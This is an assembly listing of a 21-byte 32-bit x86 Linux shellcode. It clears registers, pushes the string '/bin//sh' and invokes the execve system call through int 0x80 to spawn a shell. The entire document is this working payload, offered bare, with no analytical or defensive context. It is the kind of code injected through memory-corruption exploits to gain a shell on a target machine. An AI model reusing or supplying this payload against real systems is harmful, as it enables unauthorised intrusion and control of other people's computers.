; 21 Bytes shellcode
BITS 32
  xor ecx, ecx
  push BYTE 11
  pop eax
  cdq
  push ecx
  push 0x68732f2f
  push 0x6e69622f
  mov ebx, esp
  int 0x80
